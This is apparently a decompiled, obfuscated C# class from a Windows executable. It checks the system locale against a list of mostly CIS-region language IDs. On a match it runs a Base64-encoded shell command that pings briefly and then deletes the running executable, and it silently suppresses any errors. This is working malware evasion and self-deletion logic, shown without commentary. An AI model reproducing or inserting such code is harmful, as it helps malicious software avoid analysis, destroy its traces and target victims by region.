using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;

namespace ns3;

public class GClass3
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (Class0.smethod_0() == 1058 || Class0.smethod_0() == 1059 || Class0.smethod_0() == 1064 || Class0.smethod_0() == 1067 || Class0.smethod_0() == 1079 || Class0.smethod_0() == 1087 || Class0.smethod_0() == 1088 || Class0.smethod_0() == 1090 || Class0.smethod_0() == 1092 || Class0.smethod_0() == 2092 || Class0.smethod_0() == 2115 || Class0.smethod_0() == 1049 || Class0.smethod_0() == 1026 || Class0.smethod_0() == 1091 || Class0.smethod_0() == 1123 || Class0.smethod_0() == 1133)
			{
				Interaction.Shell(Class0.smethod_4(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
